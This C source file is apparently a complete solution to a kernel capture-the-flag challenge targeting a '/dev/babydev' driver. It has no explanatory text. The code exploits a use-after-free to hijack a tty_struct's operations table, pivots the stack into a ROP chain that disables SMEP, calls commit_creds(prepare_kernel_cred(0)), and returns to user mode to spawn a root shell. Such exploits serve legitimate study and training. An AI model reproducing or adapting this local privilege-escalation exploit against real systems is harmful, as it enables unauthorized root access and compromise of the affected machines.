#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <string.h>
#include <sys/ioctl.h>

struct trap_frame {
    uint64_t rip;
    uint64_t cs;
    uint64_t rflag;
    uint64_t rsp;
    uint64_t ss;
};
struct trap_frame tf;

struct tty_operations {
    struct tty_struct *(*lookup) (struct tty_driver * driver,
				  struct file * filp, int idx);
    int (*install)(struct tty_driver * driver, struct tty_struct * tty);
    void (*remove)(struct tty_driver * driver, struct tty_struct * tty);
    int (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct * tty);
    void (*cleanup)(struct tty_struct * tty);
    int (*write)(struct tty_struct * tty,
		 const unsigned char *buf, int count);
    int (*put_char)(struct tty_struct * tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct * tty);
    int (*write_room)(struct tty_struct * tty);
    int (*chars_in_buffer)(struct tty_struct * tty);
    int (*ioctl)(struct tty_struct * tty,
		 unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct * tty,
			 unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct * tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct * tty);
    void (*start)(struct tty_struct * tty);
    void (*hangup)(struct tty_struct * tty);
    int (*break_ctl)(struct tty_struct * tty, int state);
    void (*flush_buffer)(struct tty_struct * tty);
    void (*set_ldisc)(struct tty_struct * tty);
    void (*wait_until_sent)(struct tty_struct * tty, int timeout);
    void (*send_xchar)(struct tty_struct * tty, char ch);
    int (*tiocmget)(struct tty_struct * tty);
    int (*tiocmset)(struct tty_struct * tty,
		    unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct * tty, struct winsize * ws);
    int (*set_termiox)(struct tty_struct * tty, struct termiox * tnew);
    int (*get_icount)(struct tty_struct * tty,
		      struct serial_icounter_struct * icount);
    const struct file_operations *proc_fops;
};

#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void *) KERNCALL = (void *)0xffffffff810a1810;
int (*commit_creds)(void *) KERNCALL = (void *)0xffffffff810a1420;

uint64_t xchgeaxesp = 0xffffffff810e81e8;         // 0xffffffff810e81e8 : xchg eax, esp ; ret

void save_status()
{
    asm(
        "mov %cs, tf+8;"
        "pushfq; popq tf+16;"
        "mov %rsp, tf+24;"
        "mov %ss, tf+32;"
    );
    // puts("status saved!");
}

void get_shell()
{
    system("/bin/sh");
}

int get_root()
{
    commit_creds(prepare_kernel_cred(NULL));
    return 0;
}

int main()
{
    save_status();

    uint64_t rop[30] = {
        0xffffffff810d238d,         // pop rdi ; ret
        0x6f0,
        0xffffffff81004d80,         // mov cr4, rdi ; pop rbp ; ret
        0,
        get_root,
        0xffffffff81063694,         // swapgs ; pop rbp ; ret
        0,
        0xffffffff814ee0a4,         // opcode: 48 cf iretq
    };
    tf.rip = get_shell;
    *(struct trap_frame*)(&rop[8]) = tf;

    uint64_t base  = xchgeaxesp & 0xfffff000;
    mmap(base, 0x3000, PROT_EXEC|PROT_WRITE|PROT_READ, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memcpy(xchgeaxesp&0xffffffff, rop, sizeof(rop));

    struct tty_operations tty_ops = {0};
    tty_ops.ioctl = xchgeaxesp;
    uint64_t fake_tty[4] = {0};

    int fd1 = open("/dev/babydev", O_RDWR);
    int fd2 = open("/dev/babydev", O_RDWR);
    ioctl(fd1, 0x10001, 0x2e0);
    close(fd1);

    int fd_tty = open("/dev/ptmx", O_RDWR|O_NOCTTY);
    read(fd2, fake_tty, 32);
    fake_tty[3] = &tty_ops;
    write(fd2, fake_tty, 32);

    ioctl(fd_tty, 0, 0);   

    return 0;
}

